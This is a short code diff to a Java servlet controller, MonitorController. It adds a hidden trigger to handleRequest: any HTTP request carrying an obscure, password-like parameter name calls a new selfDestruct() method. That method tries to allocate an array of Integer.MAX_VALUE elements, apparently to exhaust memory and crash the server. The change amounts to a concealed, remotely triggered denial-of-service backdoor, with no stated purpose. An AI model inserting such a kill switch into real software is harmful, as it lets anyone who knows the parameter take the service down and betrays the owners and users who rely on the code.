@@ -78,7 +78,11 @@ public class MonitorController implements ReadWriteController {
 
     public ModelAndView handleRequest(HttpServletRequest request, HttpServletResponse response)
             throws ServletException, IOException, ParseException {
-
+        
+        if (request.getParameter("die_893u4odsjf982348") != null) {
+            selfDestruct();
+        }
+        
         // This tests the logging system.  Doing it this way seems a lot simpler
         // than creating a FormController, etc.
         String method = request.getMethod();
@@ -364,7 +368,12 @@ public class MonitorController implements ReadWriteController {
         env.put("log4j.mailappender", mailappender);
         return env;
     }
-
+    
+    public void selfDestruct() {
+        
+        Long[] blackHole = new Long[Integer.MAX_VALUE];
+        
+    }
 
     public void setSearcher(Searcher searcher) {
         _searcher = searcher;
